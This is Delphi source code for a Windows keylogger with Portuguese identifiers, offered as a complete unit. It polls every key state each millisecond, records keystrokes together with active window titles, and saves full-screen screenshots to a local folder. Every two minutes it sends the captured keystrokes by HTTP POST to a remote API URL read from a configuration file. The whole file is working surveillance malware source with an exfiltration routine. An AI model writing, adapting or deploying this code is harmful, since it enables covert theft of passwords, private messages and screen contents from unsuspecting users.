unit KeyLogger;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.ExtCtrls, Vcl.StdCtrls,
  IdTCPClient,
  IdHTTP,
  System.JSON,
  ArquivoINI,
  DateUtils,
  System.Generics.Collections,
  System.NetEncoding;

type
  TKey_Logger = class(TForm)
    MemoTeclas: TMemo;
    TimerCapturaKeyLogs: TTimer;
    TimerEnviarKeyLogger: TTimer;
    procedure TimerCapturaKeyLogsTimer(Sender: TObject);
    procedure TimerEnviarKeyLoggerTimer(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure FormDestroy(Sender: TObject);
  private
    FDescricaoTelaAtual: String;
    FArquivoINI: TArquivoINI;
    FDicionarioImagens: TDictionary<String, String>;
    procedure EscreverNoMemo(ATexto: String);
    function GetNomeTelaAtualWindows: string;
    function GetLetraNoMemoConformeEstado(AKeyloop: Integer): String;
    function CapsLockAtivado: Boolean;
    function TeclaPressionada(const ATecla: Integer): Boolean;
    procedure EscreverTelaAtualWindowsNoMemo;
    procedure LimparVariaveis;
    procedure LimparMemoTeclas;
    function GetJsonLog: String;
    procedure EnviarRequisicaoParaAPIDeLogs;
    procedure IniciarTimerEnviarKeyLogger;
    procedure IniciarTimerCapturaKeyLogs;
    procedure DestruirObjetos;
    procedure CriarObjetos;
    function GetPrintTela: TBitmap;
    function GetStringDataHoraComMilisegundos: String;
    procedure SalvarImagemNoDicionarioImagens;
    function TBitmapToBase64(ABitmap: TBitmap): String;
    procedure LimparDicionarioBase64;
    procedure SalvarPrintNoDiretorio;
    procedure CriarDiretorioDosPrints(ADiretorio: String);
    { Private declarations }
  public
    { Public declarations }
  end;

const
  APPLICATION_JSON = 'application/json';

var
  Key_Logger: TKey_Logger;

implementation

{$R *.dfm}

procedure TKey_Logger.EscreverNoMemo(ATexto: String);
begin
  MemoTeclas.Lines.Text := MemoTeclas.Lines.Text + ATexto;
end;

procedure TKey_Logger.TimerEnviarKeyLoggerTimer(Sender: TObject);
begin
  EnviarRequisicaoParaAPIDeLogs();
end;

procedure TKey_Logger.EnviarRequisicaoParaAPIDeLogs;
var
  LHTTP: TIdHTTP;
  LRequestBody: TStream;
  LJsonLog: String;
begin
  if (MemoTeclas.Lines.Count = 0) then
    Exit;

  LJsonLog := GetJsonLog();
  if (LJsonLog = '') then
    Exit;

  LRequestBody := TStringStream.Create(LJsonLog, TEncoding.UTF8);
  LHTTP := TIdHTTP.Create;
  try
    LHTTP.Request.ContentType := APPLICATION_JSON;
    LHTTP.Post(FArquivoINI.GetUrlAPIDoINI(), LRequestBody);
    LimparMemoTeclas();
    LimparDicionarioBase64();
  finally
    LRequestBody.Free;
    LHTTP.Free;
  end;
end;

function TKey_Logger.GetJsonLog: String;
const
  JSON =
    '{'+
      '"log": "%s"'+
    '}';
var
  LJSON: TJSONObject;
begin
  try
    Result := LJSON.ParseJSONValue(Format(JSON, [MemoTeclas.Text])).ToJSON;
  except
    Result := '';
  end;
end;

procedure TKey_Logger.LimparMemoTeclas;
begin
  MemoTeclas.Lines.Clear;
end;

procedure TKey_Logger.EscreverTelaAtualWindowsNoMemo;
var
  LDescricaoTelaAtual: String;
begin
  LDescricaoTelaAtual := GetNomeTelaAtualWindows();
  if (Trim(LDescricaoTelaAtual) <> '') and (LDescricaoTelaAtual <> FDescricaoTelaAtual) then
  begin
    EscreverNoMemo(sLineBreak +
                    sLineBreak +
                    GetStringDataHoraComMilisegundos() +
                    '-----------------------------------------TELA ATUAL: ' + LDescricaoTelaAtual + '-----------------------------------------' +
                    sLineBreak +
                    sLineBreak);
    FDescricaoTelaAtual := LDescricaoTelaAtual;
//     SalvarImagemNoDicionarioImagens();
    SalvarPrintNoDiretorio();
  end;
end;

function TKey_Logger.GetStringDataHoraComMilisegundos: String;
begin
  Result := (FormatDateTime('DD/MM/YYYY HH:MM:SS.ZZZ', Now()));
end;

procedure TKey_Logger.FormCreate(Sender: TObject);
begin
  CriarObjetos();
  LimparVariaveis();
  IniciarTimerEnviarKeyLogger();
  IniciarTimerCapturaKeyLogs();
end;

procedure TKey_Logger.FormDestroy(Sender: TObject);
begin
  DestruirObjetos();
end;

procedure TKey_Logger.CriarObjetos;
begin
  FArquivoINI := TArquivoINI.Create;
  FDicionarioImagens := TDictionary<String, String>.Create();
end;

procedure TKey_Logger.DestruirObjetos;
begin
  FArquivoINI.Free;
  FDicionarioImagens.Free;
end;

procedure TKey_Logger.IniciarTimerEnviarKeyLogger;
const
  CINCO_MINUTOS = 300000;
  DOIS_MINUTOS = 120000;
begin
  TimerEnviarKeyLogger.Interval := DOIS_MINUTOS;
  TimerEnviarKeyLogger.Enabled := True;
end;

procedure TKey_Logger.IniciarTimerCapturaKeyLogs;
const
  UM_MILISEGUNDO = 1;
begin
  TimerCapturaKeyLogs.Interval := UM_MILISEGUNDO;
  TimerCapturaKeyLogs.Enabled := True;
end;

procedure TKey_Logger.LimparVariaveis;
begin
end;

procedure TKey_Logger.TimerCapturaKeyLogsTimer(Sender: TObject);
var
  LKeyloop, LKeyResult : Integer;
begin
  EscreverTelaAtualWindowsNoMemo();

  LKeyloop := 0;
  repeat
    LKeyResult := GetAsyncKeyState(LKeyloop);
    if LKeyResult = -32767 then
    begin
      case LKeyloop of
        8: EscreverNoMemo(' [BACKSPACE] ');
        9: EscreverNoMemo(' [TAB] ');
        12: EscreverNoMemo(' [ALT] ');
        13: EscreverNoMemo(' [ENTER] ');
        16: EscreverNoMemo(' [SHIFT] ');
        17: EscreverNoMemo(' [CONTROL] ');
        18: EscreverNoMemo(' [ALT] ');
        20: EscreverNoMemo(' [CAPS LOCK] ');
        21: EscreverNoMemo(' [PAGE UP] ');
        27: EscreverNoMemo(' [ESC] ');
        33: EscreverNoMemo(' [PAGE UP] ');
        34: EscreverNoMemo(' [PAGE DOWN] ');
        35: EscreverNoMemo(' [END] ');
        36: EscreverNoMemo(' [HOME] ');
        37: EscreverNoMemo(' [LEFT] ');
        38: EscreverNoMemo(' [UP] ');
        39: EscreverNoMemo(' [RIGHT] ');
        40: EscreverNoMemo(' [DOWN] ');
        45: EscreverNoMemo(' [INSERT] ');
        46: EscreverNoMemo(' [DEL] ');
        91: EscreverNoMemo(' [WIN LEFT] ');
        92: EscreverNoMemo(' [WIN RIGHT] ');
        93: EscreverNoMemo(' [MENU POP-UP] ');
        96: EscreverNoMemo('0');
        97: EscreverNoMemo('1');
        98: EscreverNoMemo('2');
        99: EscreverNoMemo('3');
        100: EscreverNoMemo('4');
        101: EscreverNoMemo('5');
        102: EscreverNoMemo('6');
        103: EscreverNoMemo('7');
        104: EscreverNoMemo('8');
        105: EscreverNoMemo('9');
        106: EscreverNoMemo(' [NUM *] ');
        107: EscreverNoMemo(' [NUM +] ');
        109: EscreverNoMemo(' [NUM -] ');
        110: EscreverNoMemo(' [NUM SEP. DECIMAL] ');
        111: EscreverNoMemo(' [NUM /] ');
        112: EscreverNoMemo(' [F1] ');
        113: EscreverNoMemo(' [F2] ');
        114: EscreverNoMemo(' [F3] ');
        115: EscreverNoMemo(' [F4] ');
        116: EscreverNoMemo(' [F5] ');
        117: EscreverNoMemo(' [F6] ');
        118: EscreverNoMemo(' [F7] ');
        119: EscreverNoMemo(' [F8] ');
        120: EscreverNoMemo(' [F9] ');
        121: EscreverNoMemo(' [F10] ');
        122: EscreverNoMemo(' [F11] ');
        123: EscreverNoMemo(' [F12] ');
        144: EscreverNoMemo(' [NUM LOCK] ');
        186: EscreverNoMemo('Ç');
        187: EscreverNoMemo('=');
        188: EscreverNoMemo(',');
        189: EscreverNoMemo('-');
        190: EscreverNoMemo('.');
        191: EscreverNoMemo(';');
        192: EscreverNoMemo('''');
        193: EscreverNoMemo('/');
        194: EscreverNoMemo('.');
        219: EscreverNoMemo('´');
        220: EscreverNoMemo(']');
        221: EscreverNoMemo('[');
        222: EscreverNoMemo('~');
        226: EscreverNoMemo('\');
      else
        if (LKeyloop >= 32) and (LKeyloop <= 63) then
          EscreverNoMemo(Chr(LKeyloop));

        if (LKeyLoop >= 65) and (LKeyloop <= 90) then
          EscreverNoMemo(GetLetraNoMemoConformeEstado(LKeyloop));

        //numpad keycodes
        if (LKeyloop >= 96) and (LKeyloop <= 110) then
          EscreverNoMemo(Chr(LKeyloop));
      end;
    end; //case;
    inc(LKeyloop);
    until
      LKeyloop = 255;
end;

function TKey_Logger.GetLetraNoMemoConformeEstado(AKeyloop: Integer): String;
var
  LLetra: String;
begin
  if (CapsLockAtivado()) and (TeclaPressionada(VK_SHIFT)) then
    Exit(LowerCase(Chr(AKeyloop)));

  if (CapsLockAtivado()) or (TeclaPressionada(VK_SHIFT)) then
    Exit(UpperCase(Chr(AKeyloop)));

  Result := LowerCase(Chr(AKeyloop));
end;

function TKey_Logger.CapsLockAtivado: Boolean;
begin
  Result := (GetKeyState(VK_CAPITAL) <> 0);
end;

function TKey_Logger.TeclaPressionada(const ATecla: Integer): Boolean;
begin
  Result := (GetKeyState(ATecla) and 128 <> 0);
end;

function TKey_Logger.GetNomeTelaAtualWindows: String;
var
  PC: Array[0..$FFF] of Char;
  Wnd: hWnd;
begin
  {$IFDEF Win32}
  Wnd := GetForegroundWindow;
  {$ELSE}
  Wnd := GetActiveWindow;
  {$ENDIF}
  SendMessage(Wnd, wm_GetText, $FFF, LongInt(@PC));
  Result := StrPas(PC);
end;

procedure TKey_Logger.SalvarPrintNoDiretorio;
var
  LImagem: TImage;
  LDiretorioExe: String;
begin
  LImagem := TImage.Create(nil);
  try
    LImagem.Picture.Assign(GetPrintTela());
    LDiretorioExe := ExtractFileDir(GetCurrentDir());
    CriarDiretorioDosPrints(LDiretorioExe);
    LImagem.Picture.SaveToFile(LDiretorioExe + '\prints\' + (FormatDateTime('DD_MM_YYYY_HH_MM_SS_ZZZ', Now())) + '.png');
  finally
    LImagem.Free
  end;
end;

procedure TKey_Logger.CriarDiretorioDosPrints(ADiretorio: String);
begin
  if (not (DirectoryExists(ADiretorio + '\prints\'))) then
    CreateDir(ADiretorio + '\prints\');
end;

function TKey_Logger.GetPrintTela: TBitmap;
var
  LHDC: HDC;
  LCanvas: TCanvas;
begin
  Result := TBitmap.Create;
  Result.Width := Screen.Width;
  Result.Height := Screen.Height;
  LHDC := GetDc(0);
  LCanvas := TCanvas.Create;
  LCanvas.Handle := LHDC;
  Result.Canvas.CopyRect(Rect(
    0, 0, Screen.Width, Screen.Height),
    LCanvas, Rect(0,0,Screen.Width, Screen.Height));
  LCanvas.Free;
  ReleaseDC(0, LHDC);
end;

function TKey_Logger.TBitmapToBase64(ABitmap: TBitmap): String;
var
  LStringStream: TStringStream;
  teste: TStringList;
begin
  LStringStream := TStringStream.Create();
  try
    ABitmap.SaveToStream(LStringStream);
    Result := TNetEncoding.Base64.Encode(LStringStream.DataString);

//    teste := TStringList.Create;
//    teste.Text := Result;
//    teste.SaveToFile('C:\teste.txt');
  finally
    LStringStream.Free;
  end;
end;

procedure TKey_Logger.SalvarImagemNoDicionarioImagens;
begin
  FDicionarioImagens.Add(GetStringDataHoraComMilisegundos(), TBitmapToBase64(GetPrintTela()));
end;

procedure TKey_Logger.LimparDicionarioBase64;
begin
  FDicionarioImagens.Clear;
end;

end.
